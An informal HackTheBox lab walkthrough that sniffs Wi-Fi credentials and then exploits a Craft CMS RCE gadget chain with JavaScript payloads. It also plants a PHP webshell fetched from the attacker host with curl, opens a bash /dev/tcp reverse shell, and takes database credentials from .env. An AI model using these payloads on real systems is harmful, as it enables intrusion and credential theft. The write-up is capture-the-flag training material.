# HackTheBox Layover (Medium Difficulty) 

Box starts with RDP login given to you ( contractor / Contractor2026! )
Its a Linux box

Connected with:
```
xfreerdp /v:10.129.126.71 /u:contractor /p:'Contractor2026' /cert:ignore /dynamic-resolution
```

```
sudo su
```
This works we have root box, need to move laterally...

When you open web browser itll bring you to a "Internation WiFi Connect" with the theme of a airport

You will automaticlly be directed to this domain : `http://portal.international.htb/miles` nice

started with wifi recon, ran a big combined command to dump nmcli/NetworkManager/wpa_supplicant
see a wlan2 and wlan3. messed with wlan2 for way to long, wlan3 has monitor mode, thats what we need


```
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
```

(checked wlan2 was sitting on channel 6 once it associated, matched wlan3 to it)

kicked off a capture:
```
tshark -i wlan3 -f "tcp port 80" -w /root/gottem2.pcap
```

let it sit for a few min, figured something would log in eventually

pulled POST data out of the pcap:
```
tshark -r /root/gottem2.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

got hex back:
```
757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621
```

decoded it:
```
echo "757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621" | xxd -r -p
```

```
username=jenny&password=Fl1ghtDeck2026!
```

easy. creds in hand.

logged into the admin panel through the browser (rdp'd in so i was actually on the internal net):
```
http://portal.international.htb/admin/login
jenny / Fl1ghtDeck2026! -> worked first try
```

earlier curl -sI on the portal showed nginx + X-Powered-By: Craft CMS, so went and checked what
version this was running. turned out to be vulnerable to a known authenticated RCE via a malicious
attached Behavior (abuses Yii's AttributeTypecastBehavior to call Psy\Readline\Hoa\ConsoleProcessus::execute,
classic gadget chain stuff, matches GHSA-255j-qw47-wjh5 and friends)

popped the admin console (ctrl+shift+j), typed "allow pasting" since chrome blocks it by default,
then ran a blind sleep test to confirm:

```javascript
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
  condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
  fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
  "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
  typecastBeforeSave: "sleep 8" } ] }, "on *": "self::beforeSave" } ] } };
  const url='/index.php?p=admin/actions/element-search/search';
  const t0 = performance.now();
  const r = await fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)});
  return `status=${r.status} elapsed=${Math.round(performance.now()-t0)}ms`;
})()
```

~8000ms response. yep, RCE confirmed, blind but it's there.

made a quick webshell:
```php
<?php system($_GET['cmd']); ?>
```

spun up a server to serve it:
```
python3 -m http.server 8000
```

then weaponized the same console trick, swapped the sleep for a real command this time, had it
pull my webshell and drop it straight over the site's index.php:

```javascript
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const fire = (cmd) => {
    const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
    condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
    fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
    "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
    typecastBeforeSave: cmd } ] }, "on *": "self::beforeSave" } ] } };
    const url='/index.php?p=admin/actions/element-search/search';
    const t0 = performance.now();
    return fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)})
      .then(r=>r.text().then(t=>({status:r.status, ms: Math.round(performance.now()-t0), head:t.slice(0,60)})));
  };
  const timed = await fire("curl http://10.13.37.182:8000/shell.php --output /var/www/portal/web/index.php");
  return JSON.stringify({timed});
})()
```

checked my python server log -> GET /shell.php 200. nice, it pulled it.

tested the shell:
```
http://portal.international.htb/index.php?cmd=id
-> uid=33(www-data) gid=33(www-data) ... we're in
```

set up a listener and popped a reverse shell for something actually interactive:
```
nc -lvnp 5555
```
Send the reverse shell PoC. This i struggled on a long time trying to encode it correctly for curl to take it, cant just URLEncode it its "form style URL Encoding"
```
curl -s "http://portal.international.htb/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.13.37.182/5555+0>%261'"
```

Got connection back for user www-data. now the part i hate, its either super easy or brainfuck hard. LUCKILY this wasnt too bad.

cat'd the craft .env since that's always where the good stuff lives:
```
cat /var/www/portal/.env
```

fuck yeah:
```
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_TABLE_PREFIX=
```

got db creds and the security key in one shot. logged into mysql and poked around:
```
mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft -e "SHOW TABLES;"
```
-> found a weirdly named table: htbairways_settings

```
mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft -e "SELECT * FROM htbairways_settings;"
```

got:
```
id  name                value
1   mailRelayPassword   u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
```

that value screams "craft's own encrypted secret format" - and i already had the security key
from the .env, so just decrypted it straight up:

```
php -r 'require "/var/www/portal/vendor/autoload.php"; $s = new yii\base\Security(); $key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"; $blob = "u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w="; echo $s->decryptByKey(base64_decode($blob), $key), "\n";'
```

BOOM

```
Skyp0rt_Relay!26
```

tried it for ssh, figured it was probably reused somewhere:
```
ssh aporter@portal.international.htb
aporter@portal:~$ cat user.txt
6afc95a08014b9d********05e77
```

user flag down. now root.

```
sudo -i -> nope, cant run it
```
so started just looking at what's actually running

```
ps aux
```

something interesting:
```
/usr/sbin/cupsd -f
```

```
cups-config --version
2.4.16
```

WOOOWEEE its got a CVE, CVE-2026-34990

PoC: https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC

ran it, and anndddd

```
root@portal:~# cat root.txt
0c28233fd8a33b*******a67ea9e5d
```

done. box rooted, all it took was a lot of adderall and a broken heart in need of distraction!!!!
